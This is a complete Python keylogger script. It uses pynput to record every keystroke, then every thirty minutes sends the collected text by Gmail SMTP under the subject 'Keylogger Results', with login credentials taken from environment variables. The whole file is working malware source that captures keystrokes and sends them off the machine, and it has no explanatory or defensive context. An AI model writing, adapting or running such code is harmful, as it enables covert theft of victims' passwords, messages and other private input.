from pynput.keyboard import Key, Listener
import logging, smtplib, time, datetime, threading, os
from email.message import EmailMessage
from threading import Thread

entered = []

def setup():
    msg = EmailMessage()
    email = os.environ.get('EMAIL_NAME')
    password = os.environ.get('EMAIL_PASS')
    msg['From'] = os.environ.get('EMAIL_NAME')
    msg['To'] = os.environ.get('EMAIL_NAME')
    session = True
    email_time = datetime.datetime(1,1,1).now().time()
    email_no = 0
    return session, email_no, email_time, msg, email, password

def send_email(session, email_no, email_time, msg, email, password):
    global entered
    while session == True:
        time_now = datetime.datetime(1,1,1).now().time()
        if time_now >= email_time:
            email_no += 1
            del msg['subject']
            msg['Subject'] = 'Keylogger Results - Email No: {} Time: {}'.format(email_no, time_now)
            msg.set_content(''.join(entered).replace("'", ''))
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.login(email, password)
            server.sendmail(email, email, msg.as_string())
            server.quit()
            print('\n--------------------------EMAIL SENT----------------------------')
            print('Email No: {}'.format(email_no))
            print('Results: {}'.format(msg))
            print('--------------------------EMAIL SENT----------------------------\n')
            entered = []
            email_time = (datetime.datetime(1,1,1).now() + datetime.timedelta(0,1800)).time()

def key_listener():
    def on_press(key):
        if str(key) == 'Key.space':
            key = ' '
        elif str(key) == 'Key.backspace':
            if len(entered) > 0:
                del entered[-1]
            key = ''
        if key != '':
            entered.append(str(key))
        print('Keydown: {}'.format(key))
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    session, email_no, email_time, msg, email, password = setup()
    Thread(target = send_email, args = (session, email_no, email_time, msg, email, password)).start()
    Thread(target = key_listener).start()
